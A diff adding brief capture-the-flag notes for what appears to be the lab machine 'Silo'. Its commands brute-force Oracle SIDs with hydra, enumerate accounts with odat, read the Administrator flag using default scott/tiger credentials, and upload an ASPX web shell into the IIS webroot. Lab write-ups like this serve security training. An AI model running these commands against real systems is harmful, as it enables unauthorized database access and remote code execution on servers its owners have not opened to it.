@@ -1,0 +1,23 @@
+hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <ip>oracle-sid</ip>
+
+to get the sid
+
+then to get username and password
+
+odat all -s silo.htb -p 1521 -d <SID> -v
+
+then we can directly read flags
+
+```
+odat externaltable -s silo.htb -d XE -U scott -P tiger --getFile "C:\Users\Administrator\Desktop" "root.txt" "root.txt"
+```
+
+if want to get shell , then make a aspx payload then
+
+```
+odat dbmsxslprocessor -s silo.htb -d XE -U scott -P tiger --putFile "C:\inetpub\wwwroot" "shell.aspx" "/root/opt/silo/shell.aspx" --sysdba
+```
+
+upoading it
+
+visiting mainsite/name
